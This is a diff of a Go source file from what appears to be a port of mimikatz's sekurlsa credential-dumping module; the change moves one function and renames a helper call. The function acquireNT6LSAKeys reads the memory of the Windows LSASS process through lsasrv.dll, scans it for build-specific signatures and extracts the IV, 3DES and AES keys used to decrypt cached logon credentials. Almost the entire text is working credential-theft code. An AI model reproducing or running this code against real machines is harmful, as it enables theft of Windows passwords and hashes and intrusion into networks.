@@ -120,6 +120,62 @@ var (
 )
 
 // reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
+
+func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
+	lsasrv, err := kiwi.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
+	if err != nil {
+		return err
+	}
+	memory := make([]byte, lsasrv.size)
+	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
+	if err != nil {
+		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
+	}
+	var patches []*patchGeneric
+	switch runtime.GOARCH {
+	case "386":
+		patches = lsaInitProtectedMemoryKeyReferencesX86
+	case "amd64":
+		patches = lsaInitProtectedMemoryKeyReferencesX64
+	}
+	_, _, build := kiwi.getWindowsVersion()
+	patch := selectGenericPatch(patches, build)
+	// find special data offset
+	index := bytes.Index(memory, patch.search.data)
+	// read offset about iv
+	address := lsasrv.address + uintptr(index+patch.offsets.off0)
+	var offset uint32
+	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	if err != nil {
+		return errors.WithMessage(err, "failed to read offset about iv")
+	}
+	// read iv data
+	address += unsafe.Sizeof(offset) + uintptr(offset)
+	iv := make([]byte, 16)
+	_, err = api.ReadProcessMemory(pHandle, address, &iv[0], uintptr(16))
+	if err != nil {
+		return errors.WithMessage(err, "failed to read iv data")
+	}
+	kiwi.iv = iv
+	kiwi.log(logger.Debug, "iv data:", iv)
+	// acquire 3DES key
+	address = lsasrv.address + uintptr(index+patch.offsets.off1)
+	err = kiwi.acquireNT6LSAKey(pHandle, address, "3DES")
+	if err != nil {
+		return errors.WithMessage(err, "failed to acquire 3DES key")
+	}
+	// acquire AES key
+	address = lsasrv.address + uintptr(index+patch.offsets.off2)
+	err = kiwi.acquireNT6LSAKey(pHandle, address, "AES")
+	if err != nil {
+		return errors.WithMessage(err, "failed to acquire AES key")
+	}
+	kiwi.log(logger.Info, "acquire NT6 LSA keys successfully")
+	return nil
+}
+
+// reference:
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.h
 
 type bcryptHandleKey struct {
@@ -172,62 +228,6 @@ type bcryptKey81 struct {
 type hardKey struct {
 	secret uint32
 	data   [4]byte // self append, not used
-}
-
-// reference:
-// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
-
-func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
-	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
-	if err != nil {
-		return err
-	}
-	memory := make([]byte, lsasrv.size)
-	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
-	if err != nil {
-		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
-	}
-	var patches []*patchGeneric
-	switch runtime.GOARCH {
-	case "386":
-		patches = lsaInitProtectedMemoryKeyReferencesX86
-	case "amd64":
-		patches = lsaInitProtectedMemoryKeyReferencesX64
-	}
-	_, _, build := kiwi.getWindowsVersion()
-	patch := selectGenericPatch(patches, build)
-	// find special data offset
-	index := bytes.Index(memory, patch.search.data)
-	// read offset about iv
-	address := lsasrv.address + uintptr(index+patch.offsets.off0)
-	var offset uint32
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
-	if err != nil {
-		return errors.WithMessage(err, "failed to read offset about iv")
-	}
-	// read iv data
-	address += unsafe.Sizeof(offset) + uintptr(offset)
-	iv := make([]byte, 16)
-	_, err = api.ReadProcessMemory(pHandle, address, &iv[0], uintptr(16))
-	if err != nil {
-		return errors.WithMessage(err, "failed to read iv data")
-	}
-	kiwi.iv = iv
-	kiwi.log(logger.Debug, "iv data:", iv)
-	// acquire 3DES key
-	address = lsasrv.address + uintptr(index+patch.offsets.off1)
-	err = kiwi.acquireNT6LSAKey(pHandle, address, "3DES")
-	if err != nil {
-		return errors.WithMessage(err, "failed to acquire 3DES key")
-	}
-	// acquire AES key
-	address = lsasrv.address + uintptr(index+patch.offsets.off2)
-	err = kiwi.acquireNT6LSAKey(pHandle, address, "AES")
-	if err != nil {
-		return errors.WithMessage(err, "failed to acquire AES key")
-	}
-	kiwi.log(logger.Info, "acquire NT6 LSA keys successfully")
-	return nil
 }
 
 func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, algorithm string) error {
